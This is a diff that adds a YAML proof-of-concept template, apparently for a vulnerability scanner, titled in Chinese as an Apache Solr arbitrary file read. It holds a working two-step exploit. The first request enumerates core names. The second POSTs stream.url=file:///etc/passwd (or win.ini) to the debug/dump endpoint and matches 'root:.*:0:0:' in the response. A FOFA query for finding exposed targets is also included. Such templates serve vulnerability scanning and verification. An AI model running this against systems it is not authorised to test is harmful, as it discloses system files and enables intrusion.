@@ -1,0 +1,28 @@
+id: poc-yaml-apache-solr-debug-any-fileread
+info:
+  name: Apache Solr 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: solr
+  fofa: app="APACHE-Solr"
+variables:
+  data: 'file:///etc/passwd
+
+    file:///c://windows/win.ini'
+requests:
+- method: GET
+  path: /solr/admin/cores?indexInfo=false&wt=json
+  output:
+  - regex_match(body,`"name":"(?P<name>.*?)"`)
+  expression: "status_code == 200 && \ncontains(body,\"\\\"status\\\"\") &&\ncontains(headers,\"\
+    application/json\") &&\n!contains(body,\"<\")\n"
+- method: POST
+  path: /solr/{{.name}}/debug/dump?param=ContentStreams&wt=json
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: stream.url={{.data}}
+  expression: "status_code == 200 &&\n(\ncontains(body, \"bit app support\") && \n\
+    contains(body,\"fonts\") &&\ncontains(body,\"extensions\")\n) || (\nmatches(body,\
+    \ \"root:.*:0:0:\")\n)\n"
+transport: http
